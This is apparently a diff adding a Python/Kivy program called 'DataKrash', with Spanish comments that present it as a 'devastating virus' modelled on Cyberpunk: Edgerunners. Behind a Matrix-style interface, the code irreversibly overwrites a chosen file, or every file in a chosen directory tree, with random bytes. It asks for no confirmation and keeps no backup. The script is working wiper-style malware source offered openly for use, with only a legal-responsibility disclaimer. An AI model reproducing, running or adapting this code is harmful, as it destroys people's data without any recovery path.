@@ -1,0 +1,182 @@
+#DataKrash; Un virus devastador que provoca la diseminación de datos corruptos por todas partes. (Basado en la idea de un virus al estilo Cyberpunk: Edgerunners)
+#Siempre se me hizo atractivo la idea de hacer cosas que vieras en las películas y series y hacerlas realidad.
+#Eres responsable del uso de este script si deseas usarlo y de las consecuencias legales que puede conllevar. 
+
+
+#Version Kivy (Diseño Matrix) 
+
+#Por David Ruiz
+#Puedes usar mi script siempre y cuando me des créditos en mis redes sociales @viajatech
+#Se agredecido y dale estrella a este repositorio, gracias! 
+
+
+
+
+
+import os
+import random
+import kivy
+from kivy.app import App
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.floatlayout import FloatLayout
+from kivy.uix.button import Button
+from kivy.uix.label import Label
+from kivy.uix.popup import Popup
+from kivy.core.window import Window
+from kivy.clock import Clock
+from kivy.graphics import Color, Rectangle
+from kivy.lang import Builder
+
+kivy.require('2.0.0')
+
+# Funciones de corrupción de archivos
+def is_text_file(filepath):
+    try:
+        with open(filepath, 'r', encoding='utf-8') as file:
+            file.read(1024)
+        return True
+    except UnicodeDecodeError:
+        return False
+
+def corrupt_file(filepath):
+    try:
+        with open(filepath, 'rb') as file:
+            content = bytearray(file.read())
+        
+        if len(content) == 0:
+            raise ValueError("El archivo está vacío")
+        
+        is_text = is_text_file(filepath)
+        
+        if is_text:
+            for i in range(len(content)):
+                content[i] = random.randint(0, 255)
+        else:
+            num_corruptions = max(len(content) // 2, 1)
+            for _ in range(num_corruptions):
+                index = random.randint(0, len(content) - 1)
+                content[index] = random.randint(0, 255)
+        
+        with open(filepath, 'wb') as file:
+            file.write(content)
+        return True, f"Archivo corrompido: {filepath}"
+    except Exception as e:
+        return False, f"No se pudo corromper {filepath}: {e}"
+
+def corrupt_directory(directory):
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            filepath = os.path.join(root, file)
+            corrupt_file(filepath)
+
+class MatrixBackground(FloatLayout):
+    pass
+
+class BinaryRain(FloatLayout):
+    def __init__(self, **kwargs):
+        super(BinaryRain, self).__init__(**kwargs)
+        Clock.schedule_interval(self.update, 0.1)
+
+    def update(self, dt):
+        self.canvas.clear()
+        with self.canvas:
+            Color(1, 0, 0, 0.1)  # Rojo
+            for i in range(50):
+                x = random.randint(0, int(Window.width))
+                y = random.randint(0, int(Window.height))
+                binary = random.choice(['0', '1'])
+                Label(text=binary, pos=(x, y), color=(1, 0, 0, 0.5), font_size='20sp')
+
+class CorruptorGUI(BoxLayout):
+    def __init__(self, **kwargs):
+        super(CorruptorGUI, self).__init__(**kwargs)
+        self._keyboard = Window.request_keyboard(self._keyboard_closed, self)
+        self._keyboard.bind(on_key_down=self._on_keyboard_down)
+
+    def _keyboard_closed(self):
+        self._keyboard.unbind(on_key_down=self._on_keyboard_down)
+        self._keyboard = None
+
+    def _on_keyboard_down(self, keyboard, keycode, text, modifiers):
+        if keycode[1] == 'escape':
+            App.get_running_app().stop()
+        return True
+
+    def select_file(self):
+        from plyer import filechooser
+        filepaths = filechooser.open_file()
+        if filepaths:
+            success, message = corrupt_file(filepaths[0])
+            self.show_popup("Resultado", message)
+
+    def select_directory(self):
+        from plyer import filechooser
+        directories = filechooser.choose_dir()
+        if directories:
+            corrupt_directory(directories[0])
+            self.show_popup("Resultado", f"Directorio procesado: {directories[0]}")
+
+    def show_popup(self, title, message):
+        popup = Popup(title=title, content=Label(text=message),
+                      size_hint=(None, None), size=(400, 200))
+        popup.open()
+
+kv = '''
+<MatrixBackground>:
+    canvas.before:
+        Color:
+            rgba: 0, 0.1, 0, 1
+        Rectangle:
+            pos: self.pos
+            size: self.size
+
+<BinaryRain>:
+    canvas:
+        Color:
+            rgba: 1, 0, 0, 0.1  # Rojo
+
+<CorruptorGUI>:
+    orientation: 'vertical'
+    padding: 20
+    spacing: 10
+
+    MatrixBackground:
+    BinaryRain:
+
+    Label:
+        text: 'DataKrash by Viaja Tech'
+        font_size: '24sp'
+        color: 1, 0, 0, 1  # Rojo
+        size_hint_y: None
+        height: '44dp'
+
+    Button:
+        text: 'Seleccionar Archivo'
+        on_press: root.select_file()
+        background_color: 1, 0, 0, 1  # Rojo
+        size_hint_y: None
+        height: '44dp'
+
+    Button:
+        text: 'Seleccionar Directorio'
+        on_press: root.select_directory()
+        background_color: 1, 0, 0, 1  # Rojo
+        size_hint_y: None
+        height: '44dp'
+
+    Label:
+        text: 'Presiona ESC para salir'
+        font_size: '14sp'
+        color: 1, 0, 0, 0.7  # Rojo semi-transparente
+        size_hint_y: None
+        height: '30dp'
+'''
+
+class DataKrashApp(App):
+    def build(self):
+        Builder.load_string(kv)
+        Window.clearcolor = (0, 0, 0, 1)
+        return CorruptorGUI()
+
+if __name__ == '__main__':
+    DataKrashApp().run()
